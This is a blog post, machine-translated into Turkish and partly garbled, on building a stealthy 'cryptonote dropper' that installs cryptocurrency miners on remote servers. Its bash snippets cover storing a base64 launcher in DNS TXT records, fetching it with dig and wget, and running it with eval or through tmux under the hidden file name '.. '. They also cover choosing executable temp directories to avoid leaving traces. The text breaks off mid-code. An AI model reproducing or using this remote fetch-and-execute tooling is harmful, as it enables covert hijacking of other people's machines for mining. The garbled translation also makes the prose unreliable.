<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=tr><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link title="untoreh'in sitesi"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/tr/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="untoreh's site"property=og:title><meta content=website property=og:type><meta content=https://www.unto.re property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="Articles, logs, infos, status and live updates are published here."property=og:description><meta content=English property=og:locale><meta content=English property=og:locale:alternate><meta content=German property=og:locale:alternate><meta content=Italian property=og:locale:alternate><meta content="Mandarin Chinese"property=og:locale:alternate><meta content=Spanish property=og:locale:alternate><meta content=Hindi property=og:locale:alternate><meta content=Arabic property=og:locale:alternate><meta content=Portuguese property=og:locale:alternate><meta content=Bengali property=og:locale:alternate><meta content=Russian property=og:locale:alternate><meta content=Japanese property=og:locale:alternate><meta content=Punjabi property=og:locale:alternate><meta content=Javanese property=og:locale:alternate><meta content=Vietnamese property=og:locale:alternate><meta content=French property=og:locale:alternate><meta content=Urdu property=og:locale:alternate><meta content=Turkish property=og:locale:alternate><meta content=Polish property=og:locale:alternate><meta content=Ukranian property=og:locale:alternate><meta content=Dutch property=og:locale:alternate><meta content=Greek property=og:locale:alternate><meta content=Swedish property=og:locale:alternate><meta content=Zulu property=og:locale:alternate><meta content=Romanian property=og:locale:alternate><meta content=Malay property=og:locale:alternate><meta content=Korean property=og:locale:alternate><meta content=Thai property=og:locale:alternate><meta content=Filipino property=og:locale:alternate><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Bir kriptonot damlalığının günlükleri</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/tr/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/tr/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-24T20:47:55.278","inLanguage":"tr","name":"","mainEntityOfPage":{"@id":"/tr/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/tr/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" untoreh-ışık"class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Web Sitesinde Ara"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/tr/posts/><i class="fas fa-pen menu-icons"></i> gönderiler</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/tr/media/><i class="fas fa-tv menu-icons"></i> medya</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Web Sitesinde Ara"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/tr/posts/><i class="fas fa-pen menu-icons"></i> gönderiler</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/tr/media/><i class="fas fa-tv menu-icons"></i> medya</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/tr/posts/chronichles_of_a_cryptonote_dropper> Bir kriptonot damlalığının günlükleri</a></h1><blockquote id=page-description style=font-style:italic>... peni için ne kadar ileri gitmek istersin?</blockquote></div><div class=franklin-content><p>benimkini istediğini varsay<a href=https://en.wikipedia.org/wiki/Cryptocurrency> kripto para birimleri</a> uzaktan<em> gerçek</em> donanım. Benim için bir şeyler bulmalısın. Uzak sunucular demek, hayır<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> veya GPU çalışma kanıtı algoritmaları, temelde yalnızca<a href=\posts/a-few-notes-on-proof-of-work> CPU dostu paralar</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Yazılım</a></h2><p>Ara ve bul<a href=https://github.com/xmrig/xmrig> madenci</a> , ama gerçekten hoş değil, uzaktan kumandadan daha iyi kontrol edebileceğiniz bir şey istersiniz, bu yüzden bulursunuz<a href=https://github.com/Bendr0id/xmrigCC> başka bir madenci</a> . sen de istiyorsun<a href=https://github.com/Bendr0id/xmrigcc-proxy> vekil</a> , birçok bağlantı kısa ömürlü olacağından,<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> madencilik havuzunuz. Ayrıca bir<a href=https://github.com/search?q=tunnel> tünel</a> güzel olurdu.<h2 id=the_design><a class=header-anchor href=#the_design> Dizayn</a></h2><p>Bazı botnet'ler komutları aramak için blok zinciri verilerini kullanır,<a href=https://twitter.com/sarahjamielewis> birisi</a> ayrıca var gibi görünüyor<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> kaybedilen bahisler</a> her neyse, o kadar karmaşık değiliz, geçici bir dizinde kendi kendine ayıklanan yükü çeken bir komut dosyasını saklayan bazı DNS kayıtlarıyla idare edeceğiz.<em> hemen hemen</em> kurulumuna dair hiçbir iz yok. İşte yapıyı gösteren küçük bir akış şeması</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> Başlatıcı</a></h2><p>Bir başlangıç ​​komut dosyasının amacı, zamanın testine dayanacak şekilde erişilebilir ve kolayca güncellenebilir olmaktır. güncelleniyor<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> kayıtlar kolaydır ve DNS bir ağ içinde kapanan en son şeydir...çünkü IP adreslerini hatırlamak zordur...bu nedenle çoğu zaman kullanılabilir olma ihtimali yüksektir. ne zaman olduğumuzu görüyorsun<em> dağıtım komut dosyasını getirme</em>aslında zaten bir mantık yürütüyoruz, bu başlatıcı betiği, kayıtlarımızı aramak için DNS sorguları gerçekleştirme yeteneğine ihtiyacı var, DNS her yerde olabilir ama<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> kazmak</a> değil.<p>Başka bir araç indirmemiz gerekirse, burada biraz muamma var.<em> yükü indirmek için başka bir komut dosyası indirmek için</em> sadece yükü indirmeliyiz! Savunmada... bu senaryo dansı yapmak kafa karışıklığına neden olur, başlatıcının yalnızca bir uygulamasını (sürdürülebilirlik, yay) tutmaya izin verir, çoğu zaman gerekli değildir..<a href=https://en.wikipedia.org/wiki/Standalone_program> statik olarak bağlı</a> Kendi kendine barındırma veya bulut barındırma tarafından getirilen dns sorguları gerçekleştirmek için yürütülebilir dig. düşmanca, kasıtlı olarak, elbette).<p>dns kayıtlarında neler var? Kullanıyoruz<a href=https://en.wikipedia.org/wiki/TXT_record> txt</a> kayıtlar, özel bir etki alanında (burada da yedekler). Neden TXT? en büyük miktarda veriyi depolayabilenler onlar olur..<a href=https://www.ietf.org/rfc/rfc6763.txt> önerilen</a> bağlı olarak<em> bir şeyler</em> . Özel olarak kullanıyoruz<a href=https://www.cloudflare.com/> bulut parlaması</a> ücretsiz olduğu ve hemen hemen şehirdeki tek oyuncu olduğu için DNS oyunumuz için (<em> pek iyi değil ama diğer alternatif pales özellikleri akıllıca</em> ). Birden fazla veri parçasını bilgisayarda saklayabilirsiniz.<em> aynı</em> kayıt... bu kafa karıştırıcı olmaya başlar ve bazı özellikler için uğraşır...(teğet) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> eskiden</a> izin vermek<em> zincirlenmiş</em>TXT toplam ~ 9k bayt kaydeder, dokümanlar artık ~ 2k bayt belirtiyor, değişiklikten önce ~ 6k kullandığımı düşünüyorum ve komut dosyasını sıkıştırılmamış olarak sunuyordum, bundan sonra komut dosyasını inceltmem ve elden önce sıkıştırmam gerekiyordu (aslında ben kullanmaya çalıştı<a href=https://freedns.afraid.org/> serbest bırakılanlar</a> sağlayıcı, sıkı bir yağsız TXT kayıt politikası olduğunu tahmin ederek bir gün içinde yasaklandım), ancak gzip sıkıştırması boru dostu DEĞİL gibi görünüyor ve hala sorunlara neden oluyordu, bu yüzden komut dosyasını sıkıştırmadan sıkıştırmayı başarmak zorunda kaldım ( son teğet).<p>Nasıl saklarız? TXT kayıtları yalnızca alfasayısal dizeleri destekler, hayır<a href=https://en.wikipedia.org/wiki/Null_character> NUL'ler</a> , bu yüzden onu boş olmayan bir kodlamaya sarmamız gerekiyor,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> bu kısıtlamayı karşılar ve depoladığımız için<em> zincirlenmiş</em> TXT kayıtları, çıktıyı parçalamamız gerekiyor, çünkü kabuk malzemesini kullandığımız için bu,<code>-w</code> bayrak, meşgul kutusunda bu tür bir bayrak eskiden rahatsız edici olan eski sürümlerde mevcut değildi (veya kabul ediliyordu), bir alternatif, openssl ile birlikte verilen kodlayıcıyı kullanmaktır,<code>openssl enc -base64</code>.<p>Artık dağıtım komut dosyamızı nasıl depolayacağımızı bildiğimize göre, onu ikisinden biriyle birlikte saklarız.<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> bkz. klip</a> veya manuel olarak. Nasıl çekeriz? Bindutillere veya kendimize ihtiyacımız olduğundan bahsetmiştik.<code>dig</code> ...sunma bitiş noktasını seçtikten sonra, onu indirmek istiyoruz, mevcut olan genellikle<a href=https://www.gnu.org/software/wget/> wget</a> veya<a href=https://curl.se/> kıvrılmak</a> , wget çok daha sık önceden yüklenmiş olarak bulunur, ancak meşgul kutusu yalnızca dinamik kitaplıklarla tls desteği sağlar, bu nedenle uç noktanın http hizmeti verdiğinden veya yardımcı programınızın çalıştığından emin olmalısınız.<code>wget</code> gnu-utils'den<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>denemek demek<code>-t2</code> bekleyen zamanlar<code>-T10</code> saniye olmak<code>-q</code> sessiz okuma<code>-i-</code> standart (<code>$digurl</code> ) ve yazma<code>-O-</code> standart (<code>$filename</code>). Bu komut, ilk bakışta ne indirdiğimizi ortaya çıkarmaz. Aynı nedenden dolayı diğer kabuk komutlarına çok dikkat edeceğiz veya Shell'e bağlı kalacağız (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) mümkünse yerleşikler. Yürütülebilir dosyalarınızı nereye indirdiğinize de dikkat edin, bunları çalıştırabildiğinizden emin olmak istersiniz, çünkü bazı bağlama noktaları, özellikle kaplarda ve<code>tmp</code> yollar<code>noexec</code> . Artık dns sorgulama aracımız olduğuna göre kayıtlarımızı alıyoruz.<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Bayraklar burada kendini açıklayıcıdır,<code>+short</code> sadece verinin kendisiyle ilgilendiğimiz anlamına gelir, böylece çıktıyı ayrıştırmamız gerekmez. Google gibi DNS sunucusunu belirtmek önemlidir (<code>8.8.8.8</code> ) veya bulut parlaması (<code>1.1.1.1</code> ) çünkü birçok ortam varsayılan olarak kendi dns sunucularına dns sorgularını yeniden yönlendirir veya proxy yapar. Parçalanmış betiği getirdikten sonra, onu kod çözmeye hazır hale getirmek için tırnak işaretleri ve boşluklarla ilgileniriz.<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Ya şimdi biz<em> hâlâ</em> bizim başlatıcımız yok mu? DNS dağınık, bir geri dönüş istiyoruz, başlatıcı komut dosyasını doğrudan almak için bir alt etki alanı kurmanıza izin verin. Komut dosyamızı değerlendirmeden önce, onu bazı değişkenlerle özelleştirmek istiyoruz, yine bir NAME=VALUE değişken listesini saklamak ve ayrıştırmak için bir TXT kaydı kullanalım. Değişkenler için bir geri dönüş de vardır, cloudflare URL'lere dayalı yönlendirmeler sunar, bu yönlendirmeler sunulur<em> önce</em> hedef, bu yüzden bir uç noktaya ihtiyacımız yok, sadece normal ifadeye dayalı yönlendirme kurallarını hayali bir uç noktaya yapılandırmak istiyoruz, ilgilendiğimiz şey url'nin parametreleri<code>?NAME=VALUE&NAME2=VALUE2...</code>, böylece her zaman alıntı ve çıkış kodlarına dikkat ederek yönlendirme url'sini değiştirerek başlatıcımızı parametrelendirebiliriz.<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>wget<code>-S</code> ayrıştırmak için ilgilendiğimiz yönlendirme URL'sini yazdırır. Parametrelere ve komut dosyasına sahip olarak, bunları bir dosya üzerine yazan değişkenleri değerlendiririz.<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Bu dosya, dağıtım betiği tarafından sağlanacaktır. Başlangıç ​​betiğinin son kısmı gerçek<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trambolin</a> , betiği mevcut kabuk işlemi içinde değerlendirin veya mümkünse tmux tarafından yönetilmesine izin verin.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Başlatıcı komut dosyası, ".. " adlı bir dosyaya atılır, çünkü bu,<em> ebeveyn</em> dizin. İşlem komutunda oyalanacağı için oturum komutunu dahil etmiyoruz, bunun yerine tmux oturumunu önceden başlatıyoruz ve kaynak komutunu tmux terminal arabirimi aracılığıyla gönderiyoruz. Bununla ilgili olarak, bazen bir yürütülebilir dosyayı çağırmak<code>./</code> bu karakterleri komutta tutar, bu nedenle eklemek daha iyidir<code>$PWD</code> yola..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Yük</a></h2><p>Dağıtım komut dosyamız,<code>env.sh</code> dosya ve tutmak veya yapılandırılmış olarak değişir<code>STARTING_*</code> gibi değişir<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Bu, ortamı sıfırlarken çalışan bir örneği öldürmemize ve yeniden başlatmamıza izin verir. Exec özelliklerine sahip bir tmp dizinine geçelim<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
